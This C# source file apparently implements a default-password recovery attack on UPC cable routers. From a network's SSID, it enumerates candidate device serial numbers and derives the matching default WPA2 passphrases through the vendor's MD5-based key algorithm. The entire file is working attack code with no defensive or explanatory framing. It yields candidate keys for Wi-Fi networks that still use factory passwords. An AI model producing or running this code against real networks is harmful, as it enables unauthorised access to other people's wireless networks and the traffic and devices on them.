using System;
using System.Collections.Generic;

#if NETFX_CORE
using System.Runtime.InteropServices.WindowsRuntime;
using Windows.Security.Cryptography;
using Windows.Security.Cryptography.Core;
using Windows.Storage.Streams;
#else
using System.Text;
using System.Security.Cryptography;
#endif

namespace UpcKeysConsole
{
    public static class UpcRecover
    {
        public static IEnumerable<Tuple<string, string>> GetCandidates(string essid, Mode mode)
        {
            uint target = Convert.ToUInt32(essid.Substring(3), 10);

            foreach (string serial in GetSerials(mode, target))
            {
                string input1 = serial;
                if (mode == Mode.G5)
                {
                    char[] array = serial.ToCharArray();
                    Array.Reverse(array);
                    input1 = new string(array);
                }
                byte[] h1 = ComputeMD5(input1);

                uint[] hv = new uint[4];
                for (int i = 0; i < 4; i++)
                {
                    hv[i] = h1[i * 2] | (uint)h1[i * 2 + 1] << 8;
                }
                uint w1 = Mangle(hv);

                for (int i = 0; i < 4; i++)
                {
                    hv[i] = h1[i * 2 + 8] | (uint)h1[i * 2 + 9] << 8;
                }
                uint w2 = Mangle(hv);

                string input2 = $"{w1:X8}{w2:X8}";
                byte[] h2 = ComputeMD5(input2);

                string pass = Hash2Pass(h2);

                yield return new Tuple<string, string>(serial, pass);
            }
        }

        private const int MAX0 = 9;
        private const int MAX1 = 99;
        private const int MAX2 = 9;
        private const int MAX3 = 9999;
        private const uint MAGIC_24GHZ = 0xff8d8f20;
        private const uint MAGIC_5GHZ = 0xffd9da60;

        private static IEnumerable<string> GetSerials(Mode mode, uint target)
        {
            uint[] buf = new uint[4];
            uint magic = mode == Mode.G24 ? MAGIC_24GHZ : MAGIC_5GHZ;

            for (buf[0] = 0; buf[0] <= MAX0; buf[0]++)
            {
                for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
                {
                    for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
                    {
                        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++)
                        {
                            uint serial = UpcGenerateSsid(buf, magic);
                            if (serial == target)
                            {
                                // TODO SAPP?
                                yield return $"SAAP{buf[0]}{buf[1]:D2}{buf[2]}{buf[3]:D4}";
                            }
                        }
                    }
                }
            }
        }

        private const ulong MAGIC0 = 0xb21642c9;
        private const ulong MAGIC1 = 0x68de3af;
        private const ulong MAGIC2 = 0x6b5fca6b;

        private static string Hash2Pass(byte[] hash)
        {
            string pass = string.Empty;

            for (int i = 0; i < 8; i++)
            {
                uint a = (uint)hash[i] & 0x1f;
                a -= (uint)((a * MAGIC0) >> 36) * 23;

                a = (a & 0xff) + 0x41;

                if (a >= 'I') a++;
                if (a >= 'L') a++;
                if (a >= 'O') a++;

                pass += (char)a;
            }
            return pass;
        }

        private static uint Mangle(uint[] pp)
        {
            uint a = (uint)((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
            uint b = (pp[3] - a * 9999 + 1) * 11;

            return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
        }

        private static uint UpcGenerateSsid(uint[] data, uint magic)
        {
            uint a = data[1] * 10 + data[2];
            uint b = data[0] * 2500000 + a * 6800 + data[3] + magic;

            return b - (uint)(((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
        }

#if NETFX_CORE
        private static readonly CryptographicHash md5 =
            HashAlgorithmProvider.OpenAlgorithm(HashAlgorithmNames.Md5).CreateHash();

        private static byte[] ComputeMD5(string input)
        {
            IBuffer buffMsg = CryptographicBuffer.ConvertStringToBinary(input, BinaryStringEncoding.Utf8);
            md5.Append(buffMsg);
            IBuffer buffHash = md5.GetValueAndReset();
            return buffHash.ToArray();
        }
#else
        private static readonly HashAlgorithm md5 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5");

        private static byte[] ComputeMD5(string input)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(input);
            return md5.ComputeHash(bytes);
        }
#endif
    }

    public enum Mode
    {
        G24 = 0,
        G5 = 1
    }
}